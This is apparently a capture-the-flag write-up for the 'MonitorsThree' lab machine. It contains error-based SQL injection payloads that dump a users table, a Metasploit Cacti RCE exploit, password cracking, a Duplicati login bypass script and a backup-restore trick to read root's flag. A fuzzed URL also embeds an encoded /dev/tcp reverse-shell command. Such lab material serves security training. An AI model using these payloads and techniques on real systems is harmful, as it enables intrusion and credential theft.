# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

Let's start reconnaissance.


# RECONNAISSANCE
---
To begin with this section, we must add `monitorsthree.htb` to `/etc/hosts`:

`echo '10.10.11.30 monitorsthree.htb' | sudo tee -a /etc/hosts`


![Pasted image 20250117151541.png](../../IMAGES/Pasted%20image%2020250117151541.png)

We have a simple page, source code seems normal too, let's fuzz in order to find anything useful.


## Fuzzing
----

Let's fuzz for subdomains: 

`ffuf -w main.txt -u http://monitorsthree.htb -H "Host:FUZZ.monitorsthree.htb" -ac`


After fuzzing, I found a subdomain: `cacti.monitorsthree.htb`, let's check, we need to add that one to `/etc/hosts` too:


![Pasted image 20250117152544.png](../../IMAGES/Pasted%20image%2020250117152544.png)

We got a login page, we can try to fuzz a bit more: 

![Pasted image 20250117153123.png](../../IMAGES/Pasted%20image%2020250117153123.png)

After fuzzing for a while, I found the following routes: 

`http://cacti.monitorsthree.htb/cacti/include/vendor/csrf/csrf-secret.php`

`http://cacti.monitorsthree.htb/cacti/cmd_realtime.php?1+1&&%3b0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2F10.10.11.30%2F1674%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196`

They have these contents:

![Pasted image 20250117153315.png](../../IMAGES/Pasted%20image%2020250117153315.png)

![Pasted image 20250117153335.png](../../IMAGES/Pasted%20image%2020250117153335.png)

Nothing too useful to get credentials or bypass that login page, so, I went back to the main website and found the following:

![Pasted image 20250117153418.png](../../IMAGES/Pasted%20image%2020250117153418.png)

We got a `Forgot Password?` site:

![Pasted image 20250117153441.png](../../IMAGES/Pasted%20image%2020250117153441.png)

We can try different things here, let's test [XSS](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/CROSS%20SITE%20SCRIPTING/CROSS%20SITE%20SCRIPTING%20(XSS).md):

![Pasted image 20250117153528.png](../../IMAGES/Pasted%20image%2020250117153528.png)

Not working, what about [SQLI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/INJECTIONS/SQLI/SQL%20INJECTION%20(SQLI).md):

![Pasted image 20250117153712.png](../../IMAGES/Pasted%20image%2020250117153712.png)

It worked! Let's start exploitation.

# EXPLOITATION
---

Since we already know SQLI is possible on the `Forgot_password.php` site, let's use sqlmap to automatize the process, we need to capture the request using burp and use the following command:

![Pasted image 20250117154018.png](../../IMAGES/Pasted%20image%2020250117154018.png)

Nice, let's use:

`sqlmap -r request.req -dbms=mysql --dump`


![Pasted image 20250117160216.png](../../IMAGES/Pasted%20image%2020250117160216.png)

Sqlmap executed very slow, so, I found out there was an error message, being the following:


`admin' and extractvalue(1,concat('~',database()))#`

![Pasted image 20250117160345.png](../../IMAGES/Pasted%20image%2020250117160345.png)

Since we got an error, we can use the following payload:

`admin' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())))#`

![Pasted image 20250117160454.png](../../IMAGES/Pasted%20image%2020250117160454.png)

We need to use `substring` due to the error limit, we need to intercept it:

`admin' AND extractvalue(1,concat('~',(SELECT SUBSTRING(GROUP_CONCAT(table_name),40,30) FROM information_schema.tables WHERE table_schema=database())))#`

![Pasted image 20250117160547.png](../../IMAGES/Pasted%20image%2020250117160547.png)

Found an users table, let's check it out:

`admin' AND extractvalue(1,concat('~',(SELECT SUBSTRING(GROUP_CONCAT(column_name),1,30) FROM information_schema.columns WHERE table_name='users')))#`

![Pasted image 20250117160631.png](../../IMAGES/Pasted%20image%2020250117160631.png)

Right here, we can obtain the username and the password, let's use this payload:

`admin' AND extractvalue(1,concat('~',(SELECT SUBSTRING(GROUP_CONCAT(username,':',password),1,30) FROM users)))#`

![Pasted image 20250117160713.png](../../IMAGES/Pasted%20image%2020250117160713.png)


We got the following: `adminï¼š31a181c8372e3afc59dab863430610e8`

![Pasted image 20250117160754.png](../../IMAGES/Pasted%20image%2020250117160754.png)


Nice, we got credentials:

```ad-note
`admin`:`greencacti2001`
```

We can now log into the `cacti.monitorsthree.htb` panel:

![Pasted image 20250117160918.png](../../IMAGES/Pasted%20image%2020250117160918.png)

Since we got access, we need a way to get a shell, let's look up internet and check any way to perform this:

![Pasted image 20250117161104.png](../../IMAGES/Pasted%20image%2020250117161104.png)

Found `CVE-2024-25641`, which talks about RCE in cacti 1.2.26 when authenticated, we can find an exploit in `metasploit`:

![Pasted image 20250117161259.png](../../IMAGES/Pasted%20image%2020250117161259.png)

We need to use `exploit/multi/http/cacti_package_import_rce`:

![Pasted image 20250117161401.png](../../IMAGES/Pasted%20image%2020250117161401.png)

Set options and send exploit:


![Pasted image 20250117161420.png](../../IMAGES/Pasted%20image%2020250117161420.png)

We got a meterpreter shell, let's begin PRIVESC.


# PRIVILEGE ESCALATION
---

Let's begin by checking what users we have in this machine:


![Pasted image 20250117170018.png](../../IMAGES/Pasted%20image%2020250117170018.png)

We found `marcus`, let's check the `config.php` file to see if we can retrieve some credentials, in this case, it can be found at `/var/www/html/cacti/include`:


![Pasted image 20250117170504.png](../../IMAGES/Pasted%20image%2020250117170504.png)

We found credentials for the `mysql` server, let's check what's inside:

![Pasted image 20250117170654.png](../../IMAGES/Pasted%20image%2020250117170654.png)

We got a hash for `marcus`, let's crack it:

`hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt`

For this step I will use my kali machine since I cannot run hashcat in my arch:

![Pasted image 20250117171224.png](../../IMAGES/Pasted%20image%2020250117171224.png)

We got it: `12345678910`, let's switch users:

![Pasted image 20250117171336.png](../../IMAGES/Pasted%20image%2020250117171336.png)

Nice, next step would be reading `/.ssh/id-rsa`:

![Pasted image 20250117171445.png](../../IMAGES/Pasted%20image%2020250117171445.png)

Let's copy it into a file and log in using ssh:

![Pasted image 20250117171613.png](../../IMAGES/Pasted%20image%2020250117171613.png)

In this point, we can already view `user.txt`:

![Pasted image 20250117171636.png](../../IMAGES/Pasted%20image%2020250117171636.png)

```ad-important
User: `7a74be0ac6a5b2bec1f93b6af44f3e1d`
```

From now on, we can use linpeas to check possible PE vectors:

![Pasted image 20250117172157.png](../../IMAGES/Pasted%20image%2020250117172157.png)

We got something running on port `8200`, let's use ssh tunneling:

`ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb  -i marcus.rsa`


![Pasted image 20250117172239.png](../../IMAGES/Pasted%20image%2020250117172239.png)

We find something called duplicate, let's search if there's any way to bypass that login page:

![Pasted image 20250117172342.png](../../IMAGES/Pasted%20image%2020250117172342.png)

We find a GitHub PoC to bypass the login authentication using DB Server, here's the repository: [here](https://github.com/duplicati/duplicati/issues/5197)

![Pasted image 20250117172442.png](../../IMAGES/Pasted%20image%2020250117172442.png)

First, let's locate where `duplicati` is running on the machine:

![Pasted image 20250117172612.png](../../IMAGES/Pasted%20image%2020250117172612.png)

We have `/opt/duplicati`:

![Pasted image 20250117172643.png](../../IMAGES/Pasted%20image%2020250117172643.png)

![Pasted image 20250117172655.png](../../IMAGES/Pasted%20image%2020250117172655.png)

Following the PoC, we need to download `Duplicati-server.sqlite`:

![Pasted image 20250117173054.png](../../IMAGES/Pasted%20image%2020250117173054.png)

Nice, next step would be searching for a password, and a salt:

![Pasted image 20250117173615.png](../../IMAGES/Pasted%20image%2020250117173615.png)

Let's check out `option`:

![Pasted image 20250117173635.png](../../IMAGES/Pasted%20image%2020250117173635.png)

Next we need to follow is this:

![Pasted image 20250117173815.png](../../IMAGES/Pasted%20image%2020250117173815.png)

![Pasted image 20250117173940.png](../../IMAGES/Pasted%20image%2020250117173940.png)

So, we need to do this, first, fire up burp, send a random password, intercept the request, click `do intercept -> response to this request` and grab the `session-nonce`, then do the following:

```js
var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'; 
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('session-nonce') + saltedpwd)).toString(CryptoJS.enc.Base64); 
console.log(noncedpwd);
```

```ad-summary
1. enter about:config in the search bar
2. search devtools.selfxss.count and double click
3. change value to 1.
4. `Ctrl+Shift+K`
5. Copy the `noncedpwd` returned.
```

We need to do this next:

![Pasted image 20250117174820.png](../../IMAGES/Pasted%20image%2020250117174820.png)

If we do everything correctly, we must bypass the login panel:


![Pasted image 20250117183156.png](../../IMAGES/Pasted%20image%2020250117183156.png)

First thing we see in here is a `Add backup` stuff, let's check it out:

![Pasted image 20250117183244.png](../../IMAGES/Pasted%20image%2020250117183244.png)

We can configure new backups and import configuration file, next steps would be the following;

```ad-hint
1. In Duplicati, create a new backup task with any name and description, and ensure no encryption is set.
2. Set the destination folder toÂ `/source/home/marcus`Â and the target toÂ `/source/root/root.txt`.
3. After creating the task, refresh the Duplicati home page if needed to see the new backup task, then run it
4. In Duplicati, select the backup to restore, and set the destination toÂ `/source/home/marcus/result`.
5. After the restore, checkÂ `/home/marcus/`Â on the target machine, where you should findÂ `root.txt`
```

If we follow each step, we get `root.txt`:

![Pasted image 20250117184501.png](../../IMAGES/Pasted%20image%2020250117184501.png)

![Pasted image 20250117184509.png](../../IMAGES/Pasted%20image%2020250117184509.png)

```ad-important
Root: `8e3f54354670ca667c54aeca89cd2554`
```

Just like that, CTF is done!

![Pasted image 20250117184631.png](../../IMAGES/Pasted%20image%2020250117184631.png)

